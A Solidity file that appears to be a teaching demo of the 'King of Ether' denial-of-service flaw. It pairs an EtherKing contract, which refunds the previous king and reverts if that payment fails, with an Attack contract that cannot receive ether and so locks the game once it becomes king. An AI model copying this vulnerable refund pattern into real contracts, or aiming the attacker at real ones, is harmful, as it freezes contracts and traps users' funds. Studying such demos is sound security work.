// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract EtherKing {
    uint256 public preAmount;

    address public king;

    /// amount should be grater than previous Amount;
    error insufficientAmount();

    ///failed to send
    error failed();

    function claimThrown() external payable {
        if (msg.value <= preAmount) {
            revert insufficientAmount();
        }
        (bool sent, ) = king.call{value: preAmount}("");
        if (!sent) {
            revert failed();
        }
        preAmount = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    EtherKing etherking;

    constructor(EtherKing _etherking) {
        etherking = _etherking;
    }

    function attack() public payable {
        etherking.claimThrown{value:msg.value}();
    }
}
//0xBBa767f31960394B6c57705A5e1F0B2Aa97f0Ce8